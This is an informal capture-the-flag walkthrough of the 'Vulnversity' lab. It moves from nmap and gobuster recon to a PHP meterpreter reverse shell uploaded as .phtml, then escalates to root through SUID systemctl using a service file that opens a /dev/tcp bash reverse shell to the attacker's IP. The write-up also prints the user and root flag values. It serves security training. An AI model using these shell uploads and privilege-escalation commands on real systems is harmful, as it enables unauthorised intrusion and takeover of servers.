first lets use nmap to gather info 
Nmap flag	Description
-sV	Attempts to determine the version of the services running
-p <x> or -p-	Port scan for port <x> or scan all ports
-Pn	Disable host discovery and scan for open ports
-A	Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	Scan with the default Nmap scripts
-v	Verbose mode
-sU	UDP port scan
-sS	TCP SYN port scan


using nmap Service version scan we got this : 

////////////////////

nmap -sV 10.10.222.146 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 11:55 UTC
Nmap scan report for 10.10.222.146
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.57 seconds

 Mon  5 May - 11:56  ~/Desktop/work/tryhackme/TryHack3M:BricksH

/////////////////////////////////////

so there are 6 ports open 

version of the squid proxy is running on the machine : 3128/tcp open  http-proxy  Squid http proxy 3.5.12




How many ports will Nmap scan if the flag -p-400 was used?

400 


to check the os lets use nmap -O 

/////////////////

sudo nmap -O 10.10.222.146
[sudo] password for Abad: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 11:59 UTC
Nmap scan report for 10.10.222.146
Host is up (0.13s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.69 seconds

////////////////

Operating System:

    Linux 4.4 (likely Ubuntu 16.04 or Debian-based, since Linux 4.4 was used in those distros).


so its ubuntu 

because when u see the result of nmap -sV ull notice that the machine that the web server is running on is ubuntu 
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))





the web server is running on this port : 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))



now lets find the directory that has an upload form page: 

lets use gobuster :

///////////////////////////////////////





gobuster dir -u http://10.10.222.146:3333 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.222.146:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 299]
/.hta                 (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.222.146:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.222.146:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.222.146:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.10.222.146:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.222.146:3333/js/]
/server-status        (Status: 403) [Size: 303]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished






////////////////////




we found an upload form here : http://10.10.222.146:3333/internal/ 


u can use burpsuite to find out which extention is suitable for the upload cause not all the extentions are allowed , for now
phtml works 

lets create the shell using msfvenom : msfvenom -p php/meterpreter/reverse_tcp LHOST=10.21.180.29 LPORT=4444 -f raw > vulnversity.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes

lets change it to the propre extention and upload it : mv vulnversity§.php§ vulnversity.phtml 


using gobuster to find where we can trigger the shellupload 

//////////////////////////


gobuster dir -u http://10.10.222.146:3333/internal/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.222.146:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/css                  (Status: 301) [Size: 328] [--> http://10.10.222.146:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]
/uploads              (Status: 301) [Size: 332] [--> http://10.10.222.146:3333/internal/uploads/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================


/////////////////////////////////////

now that we now that we can trigger the shell from here http://10.10.222.146:3333/internal/uploads/ lets settup our 
listener in metasploit , this is the module with my options : msf6 exploit(multi/handler) > options 

///////////////////////////////

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.21.180.29     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.


/////////////////////////////////



now lets trigger the shell while listening :

http://10.10.222.146:3333/internal/uploads/vulnversity.phtml


we got the shell : 

/////////////////////////

msf6 exploit(multi/handler) > exploit 
[*] Started reverse TCP handler on 10.21.180.29:4444 
[*] Sending stage (40004 bytes) to 10.10.222.146
[*] Meterpreter session 1 opened (10.21.180.29:4444 -> 10.10.222.146:55360) at 2025-05-05 12:34:11 +0000

meterpreter > 

////////////////////////////



to find the name of who manages the webserver , lets check what is under home : 


/////////////////////

meterpreter > ls /home/
Listing: /home/
===============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2019-08-01 01:58:17 +0000  bill

meterpreter > 

//////////////////


so his name is bill

the user flag can be found here :

////////////////////////////

meterpreter > ls /home/bill/
Listing: /home/bill/
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  220   fil   2019-08-01 01:57:22 +0000  .bash_logout
100644/rw-r--r--  3771  fil   2019-08-01 01:57:22 +0000  .bashrc
100644/rw-r--r--  655   fil   2019-08-01 01:57:22 +0000  .profile
100644/rw-r--r--  33    fil   2019-08-01 01:58:17 +0000  user.txt

meterpreter > cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
meterpreter > 


//////////////////////////


Now that I have compromised this machine, we will escalate our privileges and become the superuser (root).

In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, you will need to write to the shadowers file that you do not have access to; root does, so it has root privileges to make the right changes.


some commands may not work directly on meterpreter so type shell and it will give u an interactive shell as the 
normal one 


////////////////////////

meterpreter > shell
Process 2017 created.
Channel 2 created.
je 
/bin/sh: 1: je: not found
whoami
www-data
find / -user root -perm -4000 -exec ls -ldb {} \;
find: '/proc/tty/driver': Permission denied
find: '/proc/1/t









////////////////


lets find all SUID files on the system 

////////////////////////
lets use this cmnd 

find / -user root -perm -4000 2>/dev/null

/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs

//////////////////////////

the one that stands out for this ctf is : /bin/systemctl


when we type /bin/systemctl status If it shows root-level service status (not just user-level), you might be able to go further.

///////////////////

goood 

| `-365 /lib/systemd/systemd-journald
             |-snapd.service
             | `-878 /usr/lib/snapd/snapd
             |-vsftpd.service
             | `-1197 /usr/sbin/vsftpd /etc/vsftpd.conf
             |-systemd-timesyncd.service
             | `-506 /lib/systemd/systemd-timesyncd
             |-ssh.service
             | `-1268 /usr/sbin/sshd -D
             |-systemd-logind.service
             | `-845 /lib/systemd/systemd-logind
             |-system-getty.slice
             | `-getty@tty1.service
             |   `-1302 /sbin/agetty --noclear tty1 linux
             |-systemd-udevd.service
             | `-455 /lib/systemd/systemd-udevd
             |-polkitd.service
             | `-936 /usr/lib/policykit-1/polkitd --no-debug
             |-php7.0-fpm.service
             | |-1338 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)                      
             | |-1347 php-fpm: pool www                                                            
             | `-1348 php-fpm: pool www                                                            
             |-rsyslog.service
             | `-835 /usr/sbin/rsyslogd -n
             |-nmbd.service
             | `-1362 /usr/sbin/nmbd -D
             |-smbd.service
             | |-1016 /usr/sbin/smbd -D
             | |-1031 /usr/sbin/smbd -D
             | `-1214 /usr/sbin/smbd -D
             |-lxcfs.service
             | `-828 /usr/bin/lxcfs /var/lib/lxcfs/
             `-acpid.service
               `-852 /usr/sbin/acpid
nc -vl 44444 > root.service
Listening on [0.0.0.0] (family 0, port 44444)
Connection from [10.21.180.29] port 44444 [tcp/*] accepted (family 2, sport 45110)
ls


/////////////////////////

now lets create a service file in our machine and upload it later : touch root.service


////////////////

cat root.service               
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.21.180.29/9999 0>&1'

[Install]
WantedBy=multi-user.target


//////////////////  

it has my ip@ and the port am listening on 
so that it connects back to me with a root shell 

now 
on the target machine lets setup a listener for the file  : nc -vl 44444 > root.service 


and from our machine lets upload the file to the target by specifying its ip @ 

 nc -n 10.10.222.146 44444 < root.service 


now it connected and greped the file : 
//////////////////

               `-852 /usr/sbin/acpid
nc -vl 44444 > root.service
Listening on [0.0.0.0] (family 0, port 44444)
Connection from [10.21.180.29] port 44444 [tcp/*] accepted (family 2, sport 45110)
ls


//////////////

there is the file 

////////////////

nc -vl 44444 > root.service          
Listening on [0.0.0.0] (family 0, port 44444)
Connection from [10.21.180.29] port 44444 [tcp/*] accepted (family 2, sport 52746)
ls

chmod
findshell.sh
root.service
vulnversity.phtml
cat root.service


////////////////////

let  Start listening on the 9999

nc -lvnp 9999
///////////////////////////////

 Execute the payload(assume the file is under /var/www/html/internal/uploads)

/bin/systemctl enable /var/www/html/internal/uploadsroot.service
This enables a systemd service by creating symbolic links so it runs automatically at boot.


Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service
Created symlink from /etc/systemd/system/root.service -> /var/www/html/internal/uploads/root.service

What do these two symlinks do?
1. multi-user.target.wants/root.service

    This is the standard way to make systemd services auto-start on boot.

    When the system boots into multi-user mode (like most Linux servers), systemd reads this directory and loads all the services linked there.

    So this line says: “Run root.service automatically at boot.”

2. /etc/systemd/system/root.service

    This is a direct alias to your service file.

    It allows you to manage it with commands like:

systemctl start root.service
systemctl status root.service

Without this, systemd might say “unit file not found.”


/////////////////////////////////////////////////////






























websites visited :  https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740 

s


lets start the service on the target machine now 
/////////////////

/bin/systemctl start root


//////////////////


and now on our listener we are connected , lets grap the flag : 

////////////////////////////////////

root@vulnuniversity:/# cd root
cd root
root@vulnuniversity:~# ls
ls
root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
root@vulnuniversity:~# 


//////////////////////////////////


thanks to https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740 for sharing this methode of Privilege Escalation: Systemctl (Misconfigured Permissions — sudo/SUID) 
















